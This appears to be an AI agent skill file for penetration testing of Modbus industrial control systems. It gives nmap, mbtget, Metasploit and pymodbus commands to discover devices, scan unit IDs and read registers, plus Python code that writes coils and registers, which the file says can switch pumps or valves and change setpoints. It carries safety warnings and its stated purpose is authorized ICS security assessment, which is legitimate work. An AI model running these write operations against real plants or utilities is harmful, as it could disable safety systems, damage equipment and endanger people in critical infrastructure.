# Modbus Pentesting Skill

## Goal

Exploit Modbus protocol in Industrial Control Systems (ICS/SCADA) to read/write registers, control industrial equipment, and assess OT security.

## Methodology

1. **Discovery**: Identify Modbus devices
2. **Enumeration**: Read device information and registers
3. **Register Reading**: Extract sensor values and configuration
4. **Register Writing**: Modify setpoints and control values
5. **Impact Assessment**: Understand potential physical effects

## Port

- 502/TCP: Modbus TCP

## Background

Modbus is a legacy industrial protocol:
- No authentication
- No encryption
- Master/slave architecture
- Used for PLCs, RTUs, HMIs, sensors
- Register types: Coils, Inputs, Holding Registers, Input Registers

## Tools

* **nmap**: Modbus scripts
* **mbtget**: Modbus TCP client
* **modbus-cli**: Command-line Modbus client
* **pymodbus**: Python Modbus library
* **Metasploit**: Modbus modules

## Example Commands

```bash
# Nmap Modbus discovery
nmap -p502 --script modbus-discover target
nmap -p502 --script modbus-discover --script-args modbus-discover.aggressive=true target

# Using mbtget
mbtget -a 1 -r1 -p 502 target

# Check connection
nc -vz target 502
```

## Modbus Enumeration

```bash
# Using nmap
nmap -p502 --script modbus-discover target

# Output may include:
# - Device identification
# - Vendor
# - Product code
# - Revision
# - Function codes supported

# Using modbus-cli
modbus read target:502 %MW0 10  # Read 10 holding registers from 0
```

## Reading Registers

```bash
# Read holding registers (function 3)
modbus read target:502 %MW0 10
mbtget -a 1 -r3 0 10 -p 502 target

# Read input registers (function 4)
modbus read target:502 %IW0 10
mbtget -a 1 -r4 0 10 -p 502 target

# Read coils (function 1)
modbus read target:502 %M0 16
mbtget -a 1 -r1 0 16 -p 502 target

# Read discrete inputs (function 2)
modbus read target:502 %I0 16
mbtget -a 1 -r2 0 16 -p 502 target
```

## Python Modbus Client

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('target', port=502)
client.connect()

# Read holding registers (address 0, count 10)
result = client.read_holding_registers(0, 10, unit=1)
print(f"Holding registers: {result.registers}")

# Read input registers
result = client.read_input_registers(0, 10, unit=1)
print(f"Input registers: {result.registers}")

# Read coils
result = client.read_coils(0, 16, unit=1)
print(f"Coils: {result.bits}")

# Read discrete inputs
result = client.read_discrete_inputs(0, 16, unit=1)
print(f"Discrete inputs: {result.bits}")

client.close()
```

## Writing Registers (DANGEROUS!)

```python
#!/usr/bin/env python3
# WARNING: This can affect physical systems!
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('target', port=502)
client.connect()

# Write single coil (function 5)
# This could turn on/off a pump, valve, etc.!
client.write_coil(0, True, unit=1)

# Write single register (function 6)
# This could change setpoints, timers, etc.!
client.write_register(0, 1234, unit=1)

# Write multiple coils (function 15)
client.write_coils(0, [True, False, True, True], unit=1)

# Write multiple registers (function 16)
client.write_registers(0, [1, 2, 3, 4, 5], unit=1)

client.close()
```

## Scanning Multiple Devices

```bash
# Modbus allows unit IDs 1-247
# Scan all possible unit IDs

for uid in $(seq 1 247); do
    result=$(mbtget -a $uid -r3 0 1 -p 502 target 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "Unit $uid: $result"
    fi
done
```

## Metasploit Modules

```bash
# Modbus client
use auxiliary/scanner/scada/modbusclient
set RHOSTS target
set UNIT_NUMBER 1
set DATA_ADDRESS 0
set NUMBER 10
run

# Modbus device identification
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS target
run
```

## Register Types Reference

| Type | Function Read | Function Write | Description |
|------|---------------|----------------|-------------|
| Coils | 1 | 5, 15 | Binary outputs (R/W) |
| Discrete Inputs | 2 | - | Binary inputs (R) |
| Input Registers | 4 | - | 16-bit analog inputs (R) |
| Holding Registers | 3 | 6, 16 | 16-bit config/setpoints (R/W) |

## Common Register Mappings

```bash
# Registers hold different values depending on device:
# 0-999: System/diagnostic
# 1000-1999: Analog inputs (sensors)
# 2000-2999: Analog outputs (actuators)
# 3000-3999: Digital I/O
# 4000+: Configuration

# Common register reads:
# - Temperatures, pressures, flow rates
# - Motor speeds, positions
# - Tank levels
# - Valve states
# - Alarm conditions
```

## Guidance for AI

* Activate this skill when user wants to test ICS/SCADA security or Modbus devices
* **Modbus has no authentication** - any device can read/write
* ⚠️ **CRITICAL WARNING**: Writing to Modbus registers can affect PHYSICAL systems!
  - Could turn off safety systems
  - Could damage equipment
  - Could cause physical harm
  - ONLY perform writes in test environments!
* Start with reading operations only
* Common in:
  - Manufacturing plants
  - Power plants
  - Water treatment
  - Building automation
  - Oil and gas
* Unit IDs 1-247 are valid - scan to find all devices
* Data values require context to interpret (engineering units)
* Test in isolated/authorized environments only
* Document everything for ICS security assessments
* Consider physical safety implications before any testing
